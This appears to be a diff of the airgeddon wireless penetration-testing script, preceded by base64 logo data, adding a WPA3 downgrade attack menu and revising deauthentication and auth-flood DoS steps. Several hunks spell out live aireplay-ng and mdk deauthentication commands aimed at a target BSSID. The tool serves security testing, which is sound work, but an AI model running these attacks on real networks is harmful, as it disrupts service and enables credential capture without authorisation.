T0icHJlc2VydmUiCiAgIGlua3NjYXBlOnZlcnNpb249IjAuNDguMiByOTgxOSIKICAgc29kaXBvZGk6ZG9jbmFtZT0iTSBCTFVFLnN2ZyI+PG1ldGFkYXRhCiAgIGlkPSJtZXRhZGF0YTI5Ij48cmRmOlJERj48Y2M6V29yawogICAgICAgcmRmOmFib3V0PSIiPjxkYzpmb3JtYXQ+aW1hZ2Uvc3ZnK3htbDwvZGM6Zm9ybWF0PjxkYzp0eXBlCiAgICAgICAgIHJkZjpyZXNvdXJjZT0iaHR0cDovL3B1cmwub3JnL2RjL2RjbWl0eXBlL1N0aWxsSW1hZ2UiIC8+PGRjOnRpdGxlPjwvZGM6dGl0bGU+PC9jYzpXb3JrPjwvcmRmOlJERj48L21ldGFkYXRhPjxkZWZzCiAgIGlkPSJkZWZzMjciPjxpbmtzY2FwZTpwZXJzcGVjdGl2ZQogICBzb2RpcG9kaTp0eXBlPSJpbmtzY2FwZTpwZXJzcDNkIgogICBpbmtzY2FwZTp2cF94PSIwIDogMjcgOiAxIgogICBpbmtzY2FwZTp2cF95PSIwIDogMTAwMCA6IDAiCiAgIGlua3NjYXBlOnZwX3o9IjI1MCA6IDI3IDogMSIKICAgaW5rc2NhcGU6cGVyc3AzZC1vcmlnaW49IjEyNSA6IDE4IDogMSIKICAgaWQ9InBlcnNwZWN0aXZlMzEiIC8+CgkKCQoJCgkKCQoJCgkKCQoJCgkKPC9kZWZzPjxzb2RpcG9kaTpuYW1lZHZpZXcKICAgcGFnZWNvbG9yPSIjZmZmZmZmIgogICBib3JkZXJjb2xvcj0iIzY2NjY2NiIKICAgYm9yZGVyb3BhY2l0eT0iMSIKICAgb2JqZWN0dG9sZXJhbmNlPSIxMCIKICAgZ3JpZHRvbGVyYW5jZT0iMTAiCiAgIGd1aWRldG9sZXJhbmNlPSIxMCIKICAgaW5rc2NhcGU6cGFnZW9wYWNpdHk9IjAiCiAgIGlua3NjYXBlOnBhZ2VzaGFkb3c9IjIiCiAgIGlua3NjYXBlOndpbmRvdy13aWR0aD0iMTYwMCIKICAgaW5rc2NhcGU6d2luZG93LWhlaWdodD0iODM3IgogICBpZD0ibmFtZWR2aWV3MjUiCiAgIHNob3dncmlkPSJmYWxzZSIKICAgaW5rc2NhcGU6em9vbT0iMi4xNiIKICAgaW5rc2NhcGU6Y3g9IjEyMCIKICAgaW5rc2NhcGU6Y3k9IjIyLjQ3Njk5OCIKICAgaW5rc2NhcGU6d2luZG93LXg9Ii04IgogICBpbmtzY2FwZTp3aW5kb3cteT0iLTgiCiAgIGlua3NjYXBlOndpbmRvdy1tYXhpbWl6ZWQ9IjEiCiAgIGlua3NjYXBlOmN1cnJlbnQtbGF5ZXI9IkxheWVyXzEiCiAgIGZpdC1tYXJnaW4tdG9wPSIwIgogICBmaXQtbWFyZ2luLWxlZnQ9IjAiCiAgIGZpdC1tYXJnaW4tcmlnaHQ9IjAiCiAgIGZpdC1tYXJnaW4tYm90dG9tPSIwIiAvPgo8cGF0aAogICBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIgogICBpZD0icGF0aDUiCiAgIGQ9Im0gNDEuOTQ5LDIyLjgyNCBjIDAsMTAuNzQyIC04LjcxLDE5LjQ1MyAtMTkuNDU0LDE5LjQ1MyBDIDExLjc1MSw0Mi4yNzcgMy4wNDE5OTk1LDMzLjU2NiAzLjA0MTk5OTUsMjIuODI0IDMuMDQxOTk5NSwxMi4wNzggMTEuNzUxLDMuMzcgMjIuNDk1LDMuMzcgYyAxMC43NDQsMCAxOS40NTQsOC43MDggMTkuNDU0LDE5LjQ1NCIKICAgc3R5bGU9ImZpbGw6I2ZmZmZmZiIgLz48cGF0aAogICBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIgogICBpZD0icGF0aDciCiAgIGQ9Im0gMjIuNDc0LDAgYyAxMi41NzksMCAyMi40ODEsMTAuMTM0IDIyLjQ4MSwyMi40NzcgMCwxMi40MTYgLTEwLjA2NywyMi40NzggLTIyLjQ4MSwyMi40NzggQyAxMC4wNjIsNDQuOTU2IC00LjUwOTcxNzllLTcsMzQuODkzIC00LjUwOTcxNzllLTcsMjIuNDc4IC00LjUwOTcxNzllLTcsMTAuMDYxIDEwLjA2MiwwIDIyLjQ3NCwwIE0gMjIuNDI0LDI3LjE5MSAxNi4xMzcsNi4zMjkgNy45OTU5OTk1LDMzLjAzOSBoIDEuNTI3IGMgMCwwIDEuMDI3MDAwNSwtNC42NDYgMi42OTcwMDA1LC03LjQyMSAwLjkwOSwtMS41MDcgMi4zMSwtMi43MzkgNC4xODMsLTIuNzA1IDEuMzE5LDAuMDI2IDIuNDYyLDAuNzQ3IDMuODg5LDIuNzQzIDAuODU4LDEuMTk1IDIuMTc5LDQuMjQ0IDIuMTc5LDQuMjQ0IDAsMCAxLjMyMiwtMy4wNDUgMi4xODMsLTQuMjQ0IDEuNDIzLC0xLjk5NiAyLjU2NiwtMi43MTcgMy44ODksLTIuNzQzIDEuODcxLC0wLjAzNCAzLjI3NSwxLjE5OCA0LjE4LDIuNzA4IDEuNjcxLDIuNzcxIDIuNjk3LDcuNDE4IDIuNjk3LDcuNDE4IGggMS41MzEgbCAtOC4xNDYsLTI2LjcxIC02LjI4NiwyMC44NjIgLTAuMDQ1LDAuMDM3IC0wLjA1LC0wLjAzNyB6IgogICBzdHlsZT0iZmlsbDojMDAwMDAwIiAvPgo8L3N2Zz4='
 										["Netgear"]='#D9D9D9 #330099 #D6D6D6 data:image/png;base64,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'
@@ -12829,6 +13410,19 @@ function write_et_processes() {
 	wait "${parent_pid}" 2> /dev/null
 	}
 
+#Kill the WPA3 downgrade attack processes
+function kill_wpa3_downgrade_attack_processes() {
+
+	debug_print
+
+	kill "${hostapd_mana_pid}" &> /dev/null
+	kill "${downgrade_dos_pid}" &> /dev/null
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		kill_tmux_windows
+	fi
+}
+
 #Kill the Evil Twin and Enterprise processes
 function kill_et_windows() {
 
@@ -13177,6 +13771,7 @@ function capture_handshake_evil_twin() {
 		"${mdk_command}")
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
+			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 			recalculate_windows_sizes
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -13187,7 +13782,7 @@ function capture_handshake_evil_twin() {
 			sleeptimeattack=12
 		;;
 		"Aireplay")
-			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 			recalculate_windows_sizes
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -13198,6 +13793,7 @@ function capture_handshake_evil_twin() {
 			sleeptimeattack=12
 		;;
 		"Auth DoS")
+			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 			recalculate_windows_sizes
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -13300,7 +13896,7 @@ function exec_decloak_by_dictionary() {
 
 	debug_print
 
-	iw "${interface}" set channel "${channel}" > /dev/null 2>&1
+	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 
 	local unbuffer
 	unbuffer=""
@@ -13434,6 +14030,10 @@ function validate_path() {
 		fi
 
 		case ${2} in
+			"downgradepot")
+				suggested_filename="${downgradepot_filename}"
+				downgradepotenteredpath+="${downgradepot_filename}"
+			;;
 			"wpa3pot")
 				suggested_filename="${wpa3pot_filename}"
 				wpa3potenteredpath+="${wpa3pot_filename}"
@@ -13602,6 +14202,22 @@ function read_and_clean_path() {
 	eval "${settings}"
 }
 
+#Sanitize input used for paths
+#shellcheck disable=SC2001
+function sanitize_path() {
+
+	debug_print
+
+	local sanitized
+	sanitized=$(echo "${1}" | sed 's/[^A-Za-z0-9._:\\-]/_/g')
+
+	if [ -z "${sanitized}" ]; then
+		sanitized="airgeddon_fallback_filename"
+	fi
+
+	echo "${sanitized}"
+}
+
 #Read and validate a path
 function read_path() {
 
@@ -13609,6 +14225,15 @@ function read_path() {
 
 	echo
 	case ${1} in
+		"downgradepot")
+			language_strings "${language}" 787 "green"
+			read_and_clean_path "downgradepotenteredpath"
+			if [ -z "${downgradepotenteredpath}" ]; then
+				downgradepotenteredpath="${downgrade_potpath}"
+			fi
+			downgradepotenteredpath=$(set_absolute_path "${downgradepotenteredpath}")
+			validate_path "${downgradepotenteredpath}" "${1}"
+		;;
 		"wpa3pot")
 			language_strings "${language}" 762 "blue"
 			read_and_clean_path "wpa3potenteredpath"
@@ -13660,20 +14285,20 @@ function read_path() {
 			read_and_clean_path "enteredpath"
 			check_file_exists "${enteredpath}"
 		;;
-		"targethashcatpmkidfilefordecrypt")
-			language_strings "${language}" 188 "green"
-			read_and_clean_path "hashcatpmkidenteredpath"
-			check_file_exists "${hashcatpmkidenteredpath}"
-		;;
 		"targethashcatenterprisefilefordecrypt")
-			language_strings "${language}" 188 "green"
+			language_strings "${language}" 801 "green"
 			read_and_clean_path "hashcatenterpriseenteredpath"
 			check_file_exists "${hashcatenterpriseenteredpath}"
 		;;
 		"targetjtrenterprisefilefordecrypt")
-			language_strings "${language}" 188 "green"
+			language_strings "${language}" 801 "green"
 			read_and_clean_path "jtrenterpriseenteredpath"
 			check_file_exists "${jtrenterpriseenteredpath}"
+		;;
+		"targethashcathashfilefordecrypt")
+			language_strings "${language}" 801 "green"
+			read_and_clean_path "hashcathashfileenteredpath"
+			check_file_exists "${hashcathashfileenteredpath}"
 		;;
 		"rules")
 			language_strings "${language}" 242 "green"
@@ -13868,7 +14493,7 @@ function dos_info_gathering_enterprise_menu() {
 				fi
 				identities_certificates_capture_window "${1}"
 
-				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -13895,7 +14520,7 @@ function dos_info_gathering_enterprise_menu() {
 				fi
 				identities_certificates_capture_window "${1}"
 
-				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -13916,7 +14541,7 @@ function dos_info_gathering_enterprise_menu() {
 		;;
 	esac
 
-	dos_info_gathering_enterprise_menu
+	dos_info_gathering_enterprise_menu "${1}"
 }
 
 #Launch the DoS selection menu before capture a Handshake or decloak a network and process the captured file
@@ -13964,6 +14589,7 @@ function dos_handshake_decloaking_menu() {
 				fi
 				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 				echo "${bssid}" > "${tmpdir}bl.txt"
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -13989,7 +14615,7 @@ function dos_handshake_decloaking_menu() {
 				else
 					capture_handshake_window
 				fi
-				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -14015,6 +14641,7 @@ function dos_handshake_decloaking_menu() {
 				else
 					capture_handshake_window
 				fi
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -14506,7 +15133,6 @@ function explore_for_targets_option() {
 					;;
 					"WPA3")
 						#Only WPA3 including WPA2/WPA3 in Mixed mode
-						#Not used yet in airgeddon
 						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc},${exp_auth}" >> "${tmpdir}nws.txt"
 					;;
 					"WPA")
@@ -14946,6 +15572,67 @@ function wps_pin_database_prerequisites() {
 	fi
 }
 
+#Manage and validate the prerequisites for WPA3 downgrade attack
+function wpa3_downgrade_prerequisites() {
+
+	debug_print
+
+	clear
+	current_menu="wpa3_attacks_menu"
+	language_strings "${language}" 778 "title"
+	print_iface_selected
+	print_all_target_vars
+	print_hint
+
+	if [[ -z "${mac_spoofing_desired}" ]] || [[ "${mac_spoofing_desired}" -eq 0 ]]; then
+		ask_yesno 419 "no"
+		if [ "${yesno}" = "y" ]; then
+			mac_spoofing_desired=1
+		fi
+	fi
+
+	return_to_wpa3_main_menu=1
+
+	if [ "${essid}" = "(Hidden Network)" ]; then
+		echo
+		language_strings "${language}" 784 "red"
+		language_strings "${language}" 115 "read"
+		return
+	fi
+
+	if [ "${is_docker}" -eq 1 ]; then
+		echo
+		language_strings "${language}" 779 "pink"
+		language_strings "${language}" 115 "read"
+	fi
+
+	region_check
+
+	if [ "${channel}" -gt 14 ]; then
+		echo
+		if [ "${country_code}" = "00" ]; then
+			language_strings "${language}" 706 "yellow"
+		elif [ "${country_code}" = "99" ]; then
+			language_strings "${language}" 719 "yellow"
+		else
+			language_strings "${language}" 392 "blue"
+		fi
+	fi
+
+	ask_timeout "wpa3_downgrade"
+
+	echo
+	language_strings "${language}" 782 "blue"
+	echo
+	language_strings "${language}" 783 "yellow"
+	language_strings "${language}" 115 "read"
+	echo
+	language_strings "${language}" 325 "blue"
+
+	prepare_wpa3_downgrade_interface
+	exec_wpa3_downgrade_attack
+}
+
 #Manage and validate the prerequisites for Evil Twin and Enterprise attacks
 function et_prerequisites() {
 
@@ -15381,6 +16068,66 @@ function et_dos_menu() {
 	else
 		et_dos_menu
 	fi
+}
+
+#DoS WPA3 downgrade attack menu
+function wpa3_dos_menu() {
+
+	debug_print
+
+	if [[ -n "${return_to_wpa3_main_menu}" ]] && [[ "${return_to_wpa3_main_menu}" -eq 1 ]]; then
+		return
+	fi
+
+	clear
+	language_strings "${language}" 775 "title"
+	current_menu="wpa3_dos_menu"
+	initialize_menu_and_print_selections
+	echo
+	language_strings "${language}" 47 "green"
+	print_simple_separator
+	language_strings "${language}" 776
+	print_simple_separator
+	language_strings "${language}" 139 mdk_attack_dependencies[@]
+	language_strings "${language}" 140 aireplay_attack_dependencies[@]
+	language_strings "${language}" 141 mdk_attack_dependencies[@]
+	print_hint
+
+	read -rp "> " wpa3_dos_option
+	case ${wpa3_dos_option} in
+		0)
+			return
+		;;
+		1)
+			if contains_element "${wpa3_dos_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				downgrade_dos_attack="${mdk_command}"
+				wpa3_downgrade_prerequisites
+			fi
+		;;
+		2)
+			if contains_element "${wpa3_dos_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				downgrade_dos_attack="Aireplay"
+				wpa3_downgrade_prerequisites
+			fi
+		;;
+		3)
+			if contains_element "${wpa3_dos_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				downgrade_dos_attack="Auth DoS"
+				wpa3_downgrade_prerequisites
+			fi
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+
+	wpa3_dos_menu
 }
 
 #Selected internet interface detection
@@ -15823,6 +16570,17 @@ function check_right_arping() {
 	return 1
 }
 
+#Detects if John the Ripper is able to perform the attacks
+function validate_jtr() {
+
+	debug_print
+
+	if john -h 2> /dev/null | grep -qi '\-\-pot' 2> /dev/null; then
+		return 0
+	fi
+	return 1
+}
+
 #Determine aircrack version
 #shellcheck disable=SC2034
 function get_aircrack_version() {
@@ -15835,12 +16593,11 @@ function get_aircrack_version() {
 }
 
 #Determine john the ripper version
-#shellcheck disable=SC2034
 function get_jtr_version() {
 
 	debug_print
 
-	jtr_version=$(john --help | grep -Eio 'version [a-z0-9\.]+' | awk '{print $2}')
+	jtr_version=$(john | grep -Po '(?<=version )[0-9\.]+|(?<=John the Ripper )\d+\.\d+\.\d+')
 }
 
 #Determine hashcat version
@@ -16630,7 +17387,7 @@ function check_compatibility() {
 	local term_width
 	local column_width
 	local columns
-	term_width=$(tput cols 2>/dev/null || echo 80)
+	term_width=$(tput cols 2> /dev/null || echo 80)
 	column_width=26
 	columns=$(( term_width / column_width ))
 	(( columns < 1 )) && columns=1
@@ -18289,6 +19046,7 @@ function remove_warnings() {
 	echo "${aireplay_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${mdk_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${hashcat_attacks_dependencies[@]}" > /dev/null 2>&1
+	echo "${hashcat_hash_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_onlyap_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_sslstrip2_dependencies[@]}" > /dev/null 2>&1
@@ -18309,6 +19067,7 @@ function remove_warnings() {
 	echo "${johncrunch_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${enterprise_certificates_dependencies[@]}" > /dev/null 2>&1
 	echo "${pmkid_dependencies[@]}" > /dev/null 2>&1
+	echo "${wpa3_downgrade_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${is_arm}" > /dev/null 2>&1
 }
 
